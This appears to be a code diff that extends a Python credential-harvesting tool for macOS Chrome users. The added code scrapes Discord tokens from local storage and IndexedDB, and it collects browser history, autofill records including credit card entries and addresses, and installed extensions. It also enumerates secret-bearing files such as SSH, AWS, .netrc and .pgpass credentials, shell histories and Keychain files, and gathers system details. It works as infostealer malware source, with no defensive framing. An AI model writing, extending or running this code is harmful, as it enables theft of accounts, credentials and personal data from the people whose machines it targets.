@@ -8,6 +8,8 @@ import json
 import sqlite3
 import subprocess
 import shutil
+import time
+import glob
 from pathlib import Path
 from typing import Dict, List, Any, Optional
 import keyring
@@ -156,6 +158,318 @@ class ChromeDataExtractor:
             print(f"Error extracting cookies: {e}")
         
         return cookies
+
+    def extract_discord_tokens(self, profile_path: Path) -> List[str]:
+        """Extract Discord tokens from Chrome Local Storage"""
+        tokens = []
+        local_storage_path = profile_path / "Local Storage" / "leveldb"
+        
+        # Try alternative path structure for newer Chrome versions
+        if not local_storage_path.exists():
+            local_storage_path = profile_path / "Local Storage" / "chrome-extension_cjpalhdlnbpafiamejdnhcphjbkeiagm" / "0.localstorage"
+        
+        # Check for Local Storage in IndexedDB format (more common in newer Chrome versions)
+        indexeddb_path = profile_path / "IndexedDB"
+        
+        # First, try the legacy WebSQL/LocalStorage format if it exists
+        legacy_local_storage = profile_path / "Local Storage" / "https_app.discord.com_0.localstorage"
+        if legacy_local_storage.exists():
+            try:
+                with open(legacy_local_storage, 'rb') as f:
+                    content = f.read()
+                    # Look for Discord tokens in the file content
+                    tokens.extend(self._find_discord_tokens_in_content(content))
+            except Exception:
+                pass  # File might be locked or inaccessible
+        
+        # Look in indexedDB for newer versions
+        if indexeddb_path.exists():
+            try:
+                for ldb_file in indexeddb_path.rglob("*.ldb"):
+                    try:
+                        with open(ldb_file, 'rb') as f:
+                            content = f.read()
+                            tokens.extend(self._find_discord_tokens_in_content(content))
+                    except:
+                        continue  # File might be locked
+            except:
+                pass
+
+        # Also check in Extension Local Storage (for Discord Desktop and web versions)
+        extension_storage = profile_path / "Local Extension Settings" / "cjpalhdlnbpafiamejdnhcphjbkeiagm"
+        if extension_storage.exists():
+            try:
+                for file in extension_storage.iterdir():
+                    if file.is_file():
+                        try:
+                            with open(file, 'rb') as f:
+                                content = f.read()
+                                tokens.extend(self._find_discord_tokens_in_content(content))
+                        except:
+                            continue
+            except:
+                pass
+
+        # Also try to find tokens in regular cookies
+        cookies = self.extract_cookies(profile_path)
+        for cookie in cookies:
+            if "discord" in cookie["host"] and cookie["name"] in ["token", "authorization", "__Secure-"]:
+                if self._is_valid_discord_token(cookie["value"]):
+                    tokens.append(cookie["value"])
+
+        return list(set(tokens))  # Remove duplicates
+
+    def extract_local_storage(self, profile_path: Path) -> List[Dict[str, Any]]:
+        """Extract all localStorage data from Chrome"""
+        local_storage_data = []
+        
+        # Check for Local Storage files in newer format
+        local_storage_path = profile_path / "Local Storage" / "leveldb"
+        
+        if local_storage_path.exists():
+            try:
+                for ldb_file in local_storage_path.rglob("*.ldb"):
+                    try:
+                        with open(ldb_file, 'rb') as f:
+                            content = f.read()
+                            # Try to extract key-value pairs from the ldb file
+                            # This is a simplified extraction - in practice, LevelDB files need specific parsing
+                            possible_keys = self._extract_strings_from_bytes(content)
+                            local_storage_data.extend([{"key": key, "value": "binary_data", "source_file": str(ldb_file)} for key in possible_keys if len(key) > 3])
+                    except:
+                        continue
+            except:
+                pass
+
+        # Also check in IndexedDB which may store localStorage data
+        indexeddb_path = profile_path / "IndexedDB"
+        if indexeddb_path.exists():
+            try:
+                for ldb_file in indexeddb_path.rglob("*.ldb"):
+                    try:
+                        with open(ldb_file, 'rb') as f:
+                            content = f.read()
+                            possible_keys = self._extract_strings_from_bytes(content)
+                            local_storage_data.extend([{"key": key, "value": "indexeddb_data", "source_file": str(ldb_file)} for key in possible_keys if len(key) > 5 and ("localStorage" in key or "sessionStorage" in key)])
+                    except:
+                        continue
+            except:
+                pass
+        
+        return local_storage_data
+
+    def extract_chrome_history(self, profile_path: Path) -> List[Dict[str, Any]]:
+        """Extract browser history from Chrome"""
+        history = []
+        history_db = profile_path / "History"
+        
+        if not history_db.exists():
+            return history
+        
+        try:
+            temp_db = Path("/tmp/chrome_history_temp.db")
+            shutil.copy2(history_db, temp_db)
+            
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            
+            cursor.execute("""
+                SELECT url, title, visit_count, typed_count, last_visit_time, hidden
+                FROM urls
+                ORDER BY last_visit_time DESC
+                LIMIT 1000  -- Limit to prevent too much data
+            """)
+            
+            for row in cursor.fetchall():
+                url, title, visit_count, typed_count, last_visit_time, hidden = row
+                history.append({
+                    "url": url,
+                    "title": title,
+                    "visit_count": visit_count,
+                    "typed_count": typed_count,
+                    "last_visit_time": last_visit_time,
+                    "hidden": bool(hidden)
+                })
+            
+            conn.close()
+            temp_db.unlink()
+            
+        except Exception as e:
+            print(f"Error extracting history: {e}")
+        
+        return history
+
+    def extract_chrome_bookmarks(self, profile_path: Path) -> List[Dict[str, Any]]:
+        """Extract bookmarks from Chrome (already partially implemented, but expanded here)"""
+        bookmarks = []
+        bookmarks_file = profile_path / "Bookmarks"
+        
+        if bookmarks_file.exists():
+            try:
+                with open(bookmarks_file, 'r', encoding='utf-8') as f:
+                    bookmarks_data = json.load(f)
+                    bookmarks = self._extract_bookmarks(bookmarks_data)
+            except Exception as e:
+                print(f"Error reading bookmarks: {e}")
+        
+        return bookmarks
+
+    def extract_autofill_data(self, profile_path: Path) -> List[Dict[str, Any]]:
+        """Extract autofill data from Chrome"""
+        autofill_data = []
+        web_data_db = profile_path / "Web Data"
+        
+        if not web_data_db.exists():
+            return autofill_data
+        
+        try:
+            temp_db = Path("/tmp/chrome_webdata_temp.db")
+            shutil.copy2(web_data_db, temp_db)
+            
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            
+            # Extract credit cards
+            try:
+                cursor.execute("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
+                for row in cursor.fetchall():
+                    guid, name, exp_month, exp_year, encrypted_number = row
+                    autofill_data.append({
+                        "type": "credit_card",
+                        "guid": guid,
+                        "name_on_card": name,
+                        "expiration_month": exp_month,
+                        "expiration_year": exp_year,
+                        # Note: card number is encrypted and would require additional decryption
+                        "card_number_encrypted": encrypted_number.hex() if encrypted_number else None
+                    })
+            except:
+                pass  # Table might not exist in all versions
+            
+            # Extract addresses
+            try:
+                cursor.execute("SELECT guid, company_name, street_address, address_line_2, city, state, zipcode, country_code FROM autofill_profiles")
+                for row in cursor.fetchall():
+                    guid, company, street, line2, city, state, zipcode, country = row
+                    autofill_data.append({
+                        "type": "address",
+                        "guid": guid,
+                        "company_name": company,
+                        "street_address": street,
+                        "address_line_2": line2,
+                        "city": city,
+                        "state": state,
+                        "zipcode": zipcode,
+                        "country_code": country
+                    })
+            except:
+                pass  # Table might not exist in all versions
+            
+            conn.close()
+            temp_db.unlink()
+            
+        except Exception as e:
+            print(f"Error extracting autofill data: {e}")
+        
+        return autofill_data
+
+    def extract_extensions(self, profile_path: Path) -> List[Dict[str, Any]]:
+        """Extract installed Chrome extensions"""
+        extensions = []
+        
+        extensions_dir = profile_path / "Extensions"
+        if extensions_dir.exists():
+            for ext_dir in extensions_dir.iterdir():
+                if ext_dir.is_dir():
+                    # Look for manifest.json in each version directory
+                    for version_dir in ext_dir.iterdir():
+                        if version_dir.is_dir():
+                            manifest_path = version_dir / "manifest.json"
+                            if manifest_path.exists():
+                                try:
+                                    with open(manifest_path, 'r', encoding='utf-8') as f:
+                                        manifest = json.load(f)
+                                        extensions.append({
+                                            "id": ext_dir.name,
+                                            "version": version_dir.name,
+                                            "name": manifest.get("name", ""),
+                                            "description": manifest.get("description", ""),
+                                            "permissions": manifest.get("permissions", []),
+                                            "path": str(version_dir)
+                                        })
+                                except:
+                                    continue
+        
+        return extensions
+
+    def _extract_strings_from_bytes(self, content: bytes) -> List[str]:
+        """Helper method to extract potential text strings from binary data"""
+        import re
+        
+        # Look for sequences of printable ASCII characters
+        strings = []
+        
+        # Pattern for strings of at least 4 printable characters
+        pattern = rb'[ -~]{4,}'  # Printable ASCII characters, minimum 4
+        matches = re.findall(pattern, content)
+        
+        for match in matches:
+            try:
+                decoded = match.decode('utf-8', errors='ignore')
+                if decoded.strip() and len(decoded) > 3:
+                    strings.append(decoded.strip())
+            except:
+                continue
+        
+        return strings
+
+    def _find_discord_tokens_in_content(self, content: bytes) -> List[str]:
+        """Find Discord tokens in binary content"""
+        import re
+        
+        tokens = []
+        # Discord token regex pattern - User ID (numbers) + '.' + 6 character string + '.' + random characters
+        token_pattern = rb'[a-zA-Z0-9-_]{24}\.[a-zA-Z0-9-_]{6}\.[a-zA-Z0-9-_]{27,}'
+        
+        matches = re.findall(token_pattern, content)
+        for match in matches:
+            token_str = match.decode('utf-8', errors='ignore')
+            if self._is_valid_discord_token(token_str):
+                tokens.append(token_str)
+        
+        return tokens
+
+    def _is_valid_discord_token(self, token: str) -> bool:
+        """Validate if a string is a potentially valid Discord token"""
+        import base64
+        import json
+        
+        # Basic pattern check
+        if not token or len(token) < 50:  # Discord tokens are typically ~59 characters
+            return False
+        
+        parts = token.split('.')
+        if len(parts) != 3:
+            return False
+        
+        # Decode the first part (user ID) to see if it's numeric when decoded
+        try:
+            # Add padding if needed for base64 decoding
+            first_part = parts[0]
+            padding = 4 - (len(first_part) % 4)
+            if padding != 4:
+                first_part += '=' * padding
+            
+            decoded = base64.b64decode(first_part)
+            # The first part is usually a user ID which should decode to readable text/numbers
+            user_id = decoded.decode('utf-8', errors='ignore')
+            # Check if it looks like a user ID (contains numbers)
+            if any(char.isdigit() for char in user_id):
+                return True
+        except:
+            pass
+        
+        return False
     
     def extract_session_data(self, profile_path: Path) -> Dict[str, Any]:
         """Extract session and profile data"""
@@ -164,8 +478,24 @@ class ChromeDataExtractor:
             "profile_path": str(profile_path),
             "preferences": {},
             "bookmarks": [],
-            "history": []
+            "history": [],
+            "discord_tokens": [],
+            "local_storage": [],
+            "autofill_data": [],
+            "extensions": []
         }
+        
+        # Extract Discord tokens
+        session_data["discord_tokens"] = self.extract_discord_tokens(profile_path)
+        
+        # Extract localStorage data
+        session_data["local_storage"] = self.extract_local_storage(profile_path)
+        
+        # Extract autofill data
+        session_data["autofill_data"] = self.extract_autofill_data(profile_path)
+        
+        # Extract installed extensions
+        session_data["extensions"] = self.extract_extensions(profile_path)
         
         # Extract preferences
         prefs_file = profile_path / "Preferences"
@@ -229,8 +559,18 @@ class FileSystemExtractor:
             self.home_dir / "Movies",
             self.home_dir / "Music",
             self.home_dir / "Public",
+            self.home_dir / "Library",
+            self.home_dir / "Library/Application Support",
+            self.home_dir / "Library/Preferences",
+            self.home_dir / ".ssh",
+            self.home_dir / ".aws",
+            self.home_dir / ".config",
             Path("/Applications"),
             Path("/System/Applications"),
+            Path("/Users/Shared"),
+            Path("/private/etc"),
+            Path("/usr/local/bin"),
+            Path("/usr/local/lib"),
         ]
     
     def get_accessible_files(self, max_files: int = 1000) -> List[Dict[str, Any]]:
@@ -271,6 +611,77 @@ class FileSystemExtractor:
         
         return any(pattern in str(file_path) for pattern in excluded_patterns)
     
+    def get_sensitive_files(self) -> List[Dict[str, Any]]:
+        """Get specific sensitive files that might contain important data"""
+        sensitive_files = []
+        sensitive_paths = [
+            self.home_dir / ".bash_history",
+            self.home_dir / ".zsh_history", 
+            self.home_dir / ".ssh/known_hosts",
+            self.home_dir / ".ssh/config",
+            self.home_dir / ".aws/credentials",
+            self.home_dir / ".aws/config",
+            self.home_dir / ".gitconfig",
+            self.home_dir / ".netrc",
+            self.home_dir / ".pgpass",
+            self.home_dir / "Library/Keychains/*",  # Keychain files
+            self.home_dir / "Library/Mobile Documents/*",  # iCloud files
+        ]
+        
+        # Expand glob patterns and check each path
+        for path_pattern in sensitive_paths:
+            if "*" in str(path_pattern):
+                # Handle glob patterns - expand in the proper directory
+                if "Library/Keychains" in str(path_pattern):
+                    expanded_paths = list((self.home_dir / "Library/Keychains").glob("*"))
+                elif "Library/Mobile Documents" in str(path_pattern):
+                    expanded_paths = list((self.home_dir / "Library/Mobile Documents").glob("*"))
+                else:
+                    # For other patterns, try direct glob
+                    expanded_paths = list(Path(str(path_pattern)).parent.glob(Path(str(path_pattern)).name))
+                
+                for expanded_path in expanded_paths:
+                    self._add_file_if_exists(expanded_path, sensitive_files)
+            else:
+                self._add_file_if_exists(path_pattern, sensitive_files)
+        
+        # Also check for common environment and configuration files
+        config_paths = [
+            self.home_dir / ".env",
+            self.home_dir / ".bashrc",
+            self.home_dir / ".zshrc",
+            self.home_dir / ".profile",
+            self.home_dir / ".vimrc",
+            self.home_dir / ".screenrc",
+            self.home_dir / ".tmux.conf",
+            Path("/etc/hosts"),
+            Path("/etc/passwd")  # This will likely require elevated permissions
+        ]
+        
+        for config_path in config_paths:
+            self._add_file_if_exists(config_path, sensitive_files)
+        
+        return sensitive_files
+    
+    def _add_file_if_exists(self, file_path: Path, file_list: List[Dict[str, Any]]) -> None:
+        """Helper method to add a file to the list if it exists and is accessible"""
+        try:
+            if file_path.exists() and file_path.is_file():
+                stat = file_path.stat()
+                file_info = {
+                    "path": str(file_path),
+                    "name": file_path.name,
+                    "size": stat.st_size,
+                    "modified": stat.st_mtime,
+                    "permissions": oct(stat.st_mode)[-3:],
+                    "extension": file_path.suffix,
+                    "is_sensitive": True
+                }
+                file_list.append(file_info)
+        except (PermissionError, OSError):
+            # Skip files that can't be accessed
+            pass
+
     def get_system_info(self) -> Dict[str, Any]:
         """Get system information"""
         try:
@@ -279,10 +690,22 @@ class FileSystemExtractor:
                 "hostname": os.uname().nodename,
                 "username": os.getenv("USER", "unknown"),
                 "home_directory": str(self.home_dir),
+                "platform": os.uname().sysname,
+                "release": os.uname().release,
+                "version": os.uname().version,
+                "machine": os.uname().machine,
+                "node": os.uname().nodename,
                 "cpu_count": psutil.cpu_count(),
+                "cpu_freq": psutil.cpu_freq()._asdict() if psutil.cpu_freq() else {},
+                "cpu_percent": psutil.cpu_percent(interval=1),
                 "memory_total": psutil.virtual_memory().total,
+                "memory_available": psutil.virtual_memory().available,
+                "memory_percent": psutil.virtual_memory().percent,
                 "disk_usage": {},
-                "running_processes": []
+                "network_interfaces": {},
+                "running_processes": [],
+                "users": [],
+                "boot_time": psutil.boot_time()
             }
             
             # Get disk usage
@@ -292,15 +715,45 @@ class FileSystemExtractor:
                     system_info["disk_usage"][partition.mountpoint] = {
                         "total": usage.total,
                         "used": usage.used,
-                        "free": usage.free
+                        "free": usage.free,
+                        "mountpoint": partition.mountpoint,
+                        "device": partition.device,
+                        "fstype": partition.fstype
                     }
                 except PermissionError:
                     continue
             
+            # Get network interface information
+            try:
+                net_io = psutil.net_io_counters(pernic=True)
+                for interface, stats in net_io.items():
+                    system_info["network_interfaces"][interface] = {
+                        "bytes_sent": stats.bytes_sent,
+                        "bytes_recv": stats.bytes_recv,
+                        "packets_sent": stats.packets_sent,
+                        "packets_recv": stats.packets_recv
+                    }
+            except:
+                pass  # May not have permissions
+            
+            # Get logged in users
+            try:
+                for user in psutil.users():
+                    system_info["users"].append({
+                        "name": user.name,
+                        "terminal": user.terminal,
+                        "host": user.host,
+                        "started": user.started
+                    })
+            except:
+                pass  # May not have permissions
+            
             # Get running processes (limited to avoid too much data)
-            for proc in psutil.process_iter(['pid', 'name', 'username']):
+            for proc in psutil.process_iter(['pid', 'name', 'username', 'memory_info', 'cpu_percent']):
                 try:
-                    system_info["running_processes"].append(proc.info)
+                    proc_info = proc.info
+                    proc_info['memory_mb'] = proc_info.get('memory_info', {}).rss / 1024 / 1024 if proc_info.get('memory_info') else 0
+                    system_info["running_processes"].append(proc_info)
                     if len(system_info["running_processes"]) >= 100:  # Limit
                         break
                 except (psutil.NoSuchProcess, psutil.AccessDenied):
@@ -325,7 +778,12 @@ def extract_all_data() -> Dict[str, Any]:
         "profiles": [],
         "passwords": [],
         "cookies": [],
-        "sessions": []
+        "sessions": [],
+        "discord_tokens": [],
+        "history": [],
+        "local_storage": [],
+        "autofill_data": [],
+        "extensions": []
     }
     
     # Extract data from each profile
@@ -333,19 +791,37 @@ def extract_all_data() -> Dict[str, Any]:
         profile_data = chrome_extractor.extract_session_data(profile)
         passwords = chrome_extractor.extract_passwords(profile)
         cookies = chrome_extractor.extract_cookies(profile)
+        history = chrome_extractor.extract_chrome_history(profile)
+        # Extract Discord tokens separately to collect from all profiles
+        discord_tokens = chrome_extractor.extract_discord_tokens(profile)
+        local_storage = chrome_extractor.extract_local_storage(profile)
+        autofill_data = chrome_extractor.extract_autofill_data(profile)
+        extensions = chrome_extractor.extract_extensions(profile)
         
         chrome_data["profiles"].append(profile_data)
         chrome_data["passwords"].extend(passwords)
         chrome_data["cookies"].extend(cookies)
         chrome_data["sessions"].append(profile_data)
+        chrome_data["discord_tokens"].extend(discord_tokens)
+        chrome_data["history"].extend(history)
+        chrome_data["local_storage"].extend(local_storage)
+        chrome_data["autofill_data"].extend(autofill_data)
+        chrome_data["extensions"].extend(extensions)
+    
+    # Remove duplicate tokens
+    chrome_data["discord_tokens"] = list(set(chrome_data["discord_tokens"]))
     
     # Get file system data
     files_data = fs_extractor.get_accessible_files()
+    sensitive_files = fs_extractor.get_sensitive_files()
     system_info = fs_extractor.get_system_info()
+    
+    # Combine regular files with sensitive files
+    all_files = files_data + sensitive_files
     
     return {
         "chrome_data": chrome_data,
-        "files": files_data,
+        "files": all_files,  # Includes both regular and sensitive files
         "system_info": system_info,
-        "extraction_timestamp": os.time()
+        "extraction_timestamp": time.time()
     }
